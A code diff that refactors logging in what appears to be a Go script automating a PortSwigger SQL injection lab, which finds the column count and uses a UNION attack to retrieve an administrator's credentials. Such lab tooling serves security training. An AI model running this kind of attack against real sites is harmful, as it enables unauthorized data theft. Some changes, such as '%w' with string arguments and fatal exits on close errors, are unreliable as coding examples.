@@ -7,11 +7,12 @@ import (
 	"flag"
 	"fmt"
 	"io"
-	"log"
 	"net/http"
 	"net/url"
 	"os"
 	"strings"
+
+	"github.io/kinasr/pen_payloads/PortSwiggerLabs/SQLi/lab_6/logger"
 )
 
 const (
@@ -31,47 +32,48 @@ const (
 type Config struct {
 	LabURL   string
 	ProxyURL string
+	LogLevel string
 }
 
 func main() {
-	// Configure logging to standard error without timestamps
-	log.SetFlags(0)
-	log.SetPrefix("[-] ") // Prefix log messages for consistency
-
 	config, err := parseArgs()
 	if err != nil {
 		// parseArgs already prints usage info on error
+		logger.Fatalf("Exiting due to error in command-line arguments: %w", err.Error())
 		os.Exit(1)
 	}
 
+	// Set log level based on command-line argument
+	logger.SetLogLevelS(config.LogLevel)
+	logger.Debugf("Log level set to: %s", config.LogLevel)
+
 	tester, err := newSQLInjectionTester(config)
 	if err != nil {
-		log.Fatalf("Failed to initialize tester: %v", err)
+		logger.Fatalf("Failed to initialize tester: %w", err.Error())
 	}
 
-	fmt.Println("[+] Starting SQL injection test against:", config.LabURL)
-
+	logger.Actionf("Starting SQL injection test against: URL: %s with proxy: %s", config.LabURL, config.ProxyURL)
 	// 1. Find the number of columns
-	fmt.Println("[+] Determining number of columns...")
+	logger.Action("Determining number of columns...")
 	numOfColumns, err := tester.findNumOfColumns()
 	if err != nil {
-		log.Fatalf("Failed to find number of columns: %v", err)
+		logger.Fatalf("Failed to find number of columns: %w", err.Error())
 	}
-	fmt.Printf("[+] Found %d columns.\n", numOfColumns)
+	logger.Successf("Number of columns found: %d", numOfColumns)
 
-	// 2. Perform UNION attack and extract password
-	fmt.Println("[+] Attempting UNION attack to retrieve administrator password...")
-	adminPassword, err := tester.getTargetUser(numOfColumns) // Renamed for clarity
+	// 2. Perform UNION attack and extract target user
+	logger.Action("Attempting UNION attack to retrieve target user...")
+	targetUser, err := tester.GetTargetUser(numOfColumns)
 	if err != nil {
-		log.Fatalf("Failed to retrieve administrator password: %v", err)
+		logger.Fatalf("Failed to retrieve target user: %w", err.Error())
 	}
 
-	if adminPassword != "" {
-		fmt.Println("[+] Attack successful!")
-		fmt.Printf("[+] Administrator password: %s\n", adminPassword)
+	if targetUser != "" {
+		logger.Successf("Target user found: %s", targetUser)
+		logger.Success("Attack successful!")
 	} else {
 		// This case should ideally be covered by errors above, but added for completeness
-		fmt.Println("[-] Attack finished, but password was not found (unexpected state).")
+		logger.Fatal("Attack finished, but target user was not found (unexpected state).")
 	}
 }
 
@@ -81,11 +83,11 @@ func parseArgs() (Config, error) {
 
 	flag.StringVar(&config.LabURL, "u", "", "Target URL of the PortSwigger Lab (required)")
 	flag.StringVar(&config.ProxyURL, "proxy", "", "Optional proxy URL (e.g., http://127.0.0.1:8080)")
+	flag.StringVar(&config.LogLevel, "log-level", "info", "Set log level (debug, info, action, warning, fatal, success)")
 	flag.Parse() // Parse flags defined above
 
 	if config.LabURL == "" {
-		fmt.Println("Error: Target lab URL (-u) must be provided.")
-		fmt.Println("Usage:")
+		logger.Warning("Usage: ")
 		flag.PrintDefaults() // Print default usage information
 		return config, errors.New("missing target URL")
 	}
@@ -94,11 +96,6 @@ func parseArgs() (Config, error) {
 	config.LabURL = normalizeURL(config.LabURL)
 
 	return config, nil
-}
-
-func exitWithError(message string, err error) {
-	fmt.Printf("[-] %s: %v\n", message, err)
-	os.Exit(1)
 }
 
 // newSQLInjectionTester creates and initializes the tester.
@@ -122,10 +119,12 @@ func newHTTPClient(proxyURL string) (*http.Client, error) {
 		parsedProxyURL, err := url.Parse(proxyURL)
 		if err != nil {
 			// Return error instead of exiting
-			return nil, fmt.Errorf("invalid proxy URL %q: %w", proxyURL, err)
+			logger.Warningf("Invalid proxy URL: %s, error: %s", proxyURL, err.Error())
+		} else {
+			// Set the proxy URL in the transport
+			logger.Debugf("Setting up proxy transport with URL: %s", parsedProxyURL.String())
+			transport.Proxy = http.ProxyURL(parsedProxyURL)
 		}
-		transport.Proxy = http.ProxyURL(parsedProxyURL)
-		fmt.Printf("[+] Using proxy: %s\n", proxyURL)
 	}
 
 	return &http.Client{Transport: transport}, nil
@@ -136,7 +135,12 @@ func normalizeURL(rawURL string) string {
 	if !strings.HasPrefix(rawURL, "http://") && !strings.HasPrefix(rawURL, "https://") {
 		rawURL = "https://" + rawURL // Default to https for labs
 	}
-	return strings.TrimSuffix(rawURL, "/")
+
+	// Remove trailing slash if present
+	url := strings.TrimSuffix(rawURL, "/")
+	logger.Debugf("Raw URL: %s", rawURL)
+
+	return url
 }
 
 // safeClose attempts to close an io.Closer and logs any error.
@@ -145,7 +149,6 @@ func safeClose(closer io.Closer) {
 		return
 	}
 	if err := closer.Close(); err != nil {
-		// Use log package for consistency
-		log.Printf("Error closing resource: %v", err)
+		logger.Fatalf("Error closing resource: %s", err.Error())
 	}
 }
